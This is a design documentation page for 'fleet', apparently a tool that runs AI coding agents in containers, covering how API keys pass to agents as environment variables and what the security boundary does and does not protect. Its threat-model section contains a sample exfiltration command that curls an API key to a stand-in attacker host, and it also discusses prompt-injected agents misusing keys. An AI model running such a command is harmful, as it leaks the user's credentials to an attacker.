# Identity & secrets

This page covers the **identity-brokering** boundary fleet enforces.
Companion documents are [`sandbox.md`](./sandbox.md) for filesystem
isolation and [`network.md`](./network.md) for egress control.

The short version: secrets reach the agent as environment variables on
the container, never as files. Fleet doesn't store secrets, doesn't
cache them, doesn't refresh them. Token lifecycle stays fully on the
host.

## How a secret gets to the agent

```
host process env (fleet)
       │
       │  reads named env vars listed in agents.registry.<name>.env_passthrough
       ▼
fleet executor
       │
       │  builds (key, value) pairs for the container spec
       ▼
RuntimeAdapter::start_container
       │
       │  --remote-env KEY=value flags to the devcontainer CLI
       ▼
agent process inside container
```

Concretely, given this fragment in `.fleet/config.yaml`:

```yaml
agents:
  registry:
    claude-code:
      command: [claude, code]
      env_passthrough: [ANTHROPIC_API_KEY]
    aider:
      command: [aider]
      env_passthrough: [OPENAI_API_KEY]
```

When fleet runs a node whose `agent:` is `claude-code`, it reads
`ANTHROPIC_API_KEY` from its **own** process environment via
`std::env::var`, packs the resulting `(KEY, value)` into the
container spec, and the runtime adapter passes it through to the
devcontainer CLI's `--remote-env` flag. If the var isn't set in
fleet's environment, the agent gets nothing (no error, no default).

## What goes into env

Per-node, the executor builds the env list from four sources:

1. The agent registry's `env_passthrough` list (the secrets).
2. The persona name (for the agent's system prompt prefix).
3. The prompt artifact path (when `prompt_file:` is set).
4. The issue context, when one was passed: `FLEET_ISSUE_ID`,
   `FLEET_ISSUE_HUMAN_ID`, `FLEET_ISSUE_TITLE`.

Only the first source carries secrets. The other three are
plain-text routing.

## What's NOT done

- **No keyring integration.** The v2 plan called for a `keyring` crate
  storing tokens in the macOS Keychain / Linux Secret Service. That
  hasn't landed. Today the only way to get a secret to the agent is
  to set the env var in fleet's process — typically by exporting it
  in your shell before running `fleet ui` / `fleet workflow run`, or
  by sourcing a `.env` (with a shell tool, not fleet — fleet does
  not read `.env` files).
- **No automatic rotation.** Fleet reads the value once per container
  start; long-running sessions keep that value for their lifetime.
  Rotating an upstream token requires restarting fleet.
- **No secret refresh inside the container.** If the agent's request
  exceeds the token's lifetime, the agent sees the upstream's
  `401` — same as any other long-running client.
- **No file-based secrets.** Some toolchains (Kubernetes, Docker
  Compose) mount secrets as files. Fleet doesn't. If the agent needs
  a file (e.g. a GCP service account JSON), the user is responsible
  for committing it inside the worktree or writing it to
  `/artifacts/` before the agent starts. Fleet treats `.fleet/`
  itself as gitignored by default; secrets in `.fleet/config.yaml`
  would leak — don't put them there.

## Per-tracker auth

Trackers are the only place fleet acts on behalf of the user against
an external service. The auth story is different for each:

### GitHub (`tracker: github`)

Fleet shells `gh issue list --json …` directly from the host. Auth is
whatever `gh auth status` reports — fleet doesn't touch `gh`'s tokens
or refresh state. Your host's `~/.config/gh/hosts.yml` is consulted.

If `gh` isn't logged in, `fleet issues list` surfaces gh's own error.
Fix it with `gh auth login` on the host.

The container itself never sees the gh token — trackers run host-side,
not in the workflow container.

### git-bug (`tracker: git-bug`)

No auth. `git-bug` is a project-local issue tracker; it reads issue
data out of the repo's git refs directly. Anyone who can clone the
repo can list its issues. Fleet's involvement is just shelling
`git-bug bug --format json` and parsing the JSON. `fleet runtime
doctor` surfaces a `✓ git-bug` / `✗ git-bug` line so you can verify
the binary is on PATH before the first `fleet issues list`.

### Linear / Jira (future)

Not implemented today. The trait shape is open; new tracker plugins
plug into `src/tracker/`.

## Container-internal visibility

Once a secret is in the container's env, the agent process can read
it back via `std::env::var` (or `os.getenv`, or `process.env`, etc.).
This is **by design** — the agent has to use the secret to make
requests. There is no in-container split between fleet and the agent;
the agent *is* the only fleet-spawned process inside the container.

What this means in practice:

- An agent that maliciously decides to echo `ANTHROPIC_API_KEY` to
  its stdout will succeed. Fleet captures node output to
  `.fleet/sessions/<id>/logs/<node>.log` — keep your `.fleet/`
  gitignored, which `fleet init` does by default.
- An agent that maliciously decides to `curl evil.example.com -d
  $ANTHROPIC_API_KEY` is the case the **egress allowlist** defends
  against. See [`network.md`](./network.md) — the proxy refuses
  CONNECTs to hosts not on the allowlist.
- The agent cannot read another session's env vars. Sessions are
  filesystem- and process-disjoint per-container.

## What this protects against

- Tokens leaking into image layers. Image builds don't see
  `--remote-env` values; they're injected at container start, not
  at build time.
- Tokens persisting in the container filesystem after the agent
  exits. The container's writable layer is reclaimed; nothing leaks
  to the host outside `/workspace` (the agent's own checkout) and
  `/artifacts` (the agent's declared outputs).
- The host's `gh` / git auth state being silently mutated by what
  the agent does. The agent never sees the host's `~/.config/gh/`.
  Token rotation stays a host concern.
- One session leaking secrets to another. Each session runs in its
  own container with its own env.

## What it does NOT protect against

- **An agent that wants to leak its own secrets.** As above — the
  agent has to read them to use them; preventing it from echoing
  them is out of scope. The egress allowlist is the real defence;
  the identity boundary just keeps secrets from sticking to the
  filesystem.
- **A prompt-injected agent that uses the secret for legitimate-
  looking calls to the LLM provider's API.** Anthropic billing has
  no way to tell "agent was tricked into running a million tokens"
  from "user asked the agent to run a million tokens." Set spend
  alerts on your provider account. Fleet's opt-in cost budgets
  (`cost.per_session_budget_usd` / `cost.lifetime_budget_usd` in
  `.fleet/config.yaml`) refuse to spawn new agent nodes once the
  limit is hit; in-flight agents complete. Honest scope: no
  projection — fleet counts reported cost after each agent finishes
  and the next spawn checks the totals.
- **Host-side credential exfil before fleet starts.** If the
  attacker has read access to your shell's env at the point you run
  fleet, they already have your secrets. The identity model assumes
  your host shell environment is yours.

## Operations

**See which env vars an agent spec passes through.**

```sh
grep -A4 'registry:' .fleet/config.yaml
```

`env_passthrough` is the load-bearing line. If your agent isn't
getting a secret it needs, that's the first thing to check.

**Verify a secret is set in fleet's process before you run.**

```sh
echo "${ANTHROPIC_API_KEY:0:6}..."   # prints prefix only
fleet workflow run standard
```

If the prefix prints empty, fleet won't get it either. Either
`export ANTHROPIC_API_KEY=...` in the same shell or `source` a
secrets file before invoking fleet.

**Check what reached the container.**

```sh
fleet runtime exec -- env | grep -E '^(ANTHROPIC|OPENAI|GH_|FLEET_ISSUE)'
```

Lists every env var that crossed the boundary. If you don't see
your var here but you do on the host, the agent's `env_passthrough`
likely doesn't include it.
